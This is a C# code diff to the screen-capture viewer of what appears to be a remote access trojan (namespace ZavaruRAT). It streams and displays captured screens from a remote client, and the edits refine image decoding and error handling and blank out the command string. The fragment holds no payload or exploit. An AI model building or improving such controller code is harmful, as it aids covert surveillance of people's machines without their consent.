@@ -1,5 +1,6 @@
 #region
 
+using System.Buffers;
 using Grpc.Core;
 using MessagePack;
 using ZavaruRAT.Proto;
@@ -42,23 +43,31 @@ public class ScreenCapture : CommandHandler
             {
                 await foreach (var commandResult in results.ResponseStream.ReadAllAsync(cts.Token))
                 {
-                    if (commandResult.Result.IsEmpty)
+                    if (commandResult.Result.IsEmpty || commandResult.Result.Memory.Length <= 4)
                     {
                         Console.WriteLine("Skipping command result: {0}", commandResult.HashId);
+                        Console.WriteLine("Possibly finish");
                         continue;
                     }
 
                     pictureBox.BeginInvoke(() =>
                     {
+                        var mem = commandResult.Result.Memory;
                         var image =
-                            (byte[])MessagePackSerializer.Typeless.Deserialize(commandResult.Result.ToByteArray());
+                            (byte[])MessagePackSerializer.Typeless.Deserialize(new ReadOnlySequence<byte>(mem));
 
-                        using var ms = new MemoryStream();
-                        ms.Write(image);
-                        ms.Position = 0;
+                        using var ms = new MemoryStream(image);
 
-                        pictureBox.Image = Image.FromStream(ms);
-                        pictureBox.Refresh();
+                        try
+                        {
+                            pictureBox.Image?.Dispose();
+                            pictureBox.Image = Image.FromStream(ms);
+                            pictureBox.Refresh();
+                        }
+                        catch (Exception e)
+                        {
+                            Console.WriteLine(e);
+                        }
                     });
                 }
             }
@@ -79,7 +88,7 @@ public class ScreenCapture : CommandHandler
         await _adminClient.InvokeCommandAsync(new InvokeCommandRequest
         {
             HashId = hashId,
-            Command = "screencapture",
+            Command = "",
             ClientId = clientId
         });
     }
